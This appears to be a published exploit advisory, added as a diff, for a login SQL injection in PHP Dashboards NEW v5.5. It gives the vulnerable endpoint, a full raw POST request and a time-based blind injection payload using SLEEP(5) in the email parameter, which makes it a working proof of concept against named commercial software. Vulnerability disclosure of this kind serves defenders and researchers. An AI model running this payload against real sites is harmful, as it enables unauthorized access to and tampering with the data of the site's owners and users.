@@ -1,0 +1,44 @@
+# Exploit Title: PHP Dashboards NEW v5.5 - 'Login' SQL Injection
+# Dork: N/A
+# Date: 31.05.2018
+# Exploit Author: Kağan Çapar
+# Contact: kagancapar@gmail.com
+# Vendor Homepage: https://codecanyon.net/item/php-dashboards-v50-brand-new-enterprise-edition/21540104
+
+# Version: 5.5
+# Category: Webapps
+# Tested on: Kali linux
+# Description : PHP Dashboards is prone to an SQL-injection vulnerability
+# because it fails to sufficiently sanitize user-supplied data before using
+# it in an SQL query.Exploiting this issue could allow an attacker to
+# compromise the application, access or modify data, or exploit latent
+# vulnerabilities in the underlying database.
+====================================================
+
+# PoC : SQLi :
+
+
+POST /php/save/user.php?mode=lookup HTTP/1.1
+Host: site.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101
+Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://site.com/
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 52
+Cookie: PHPSESSID=phcubu5ohtdjnd6g1bmsncro87
+Connection: keep-alive
+email=test%40test.com&password=test123&dashboardKey=
+
+Parameter: email (POST)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: email=test@test.com' AND SLEEP(5) AND
+'XnxG'='XnxG&password=test123&dashboardKey=
+
+
+====================================================
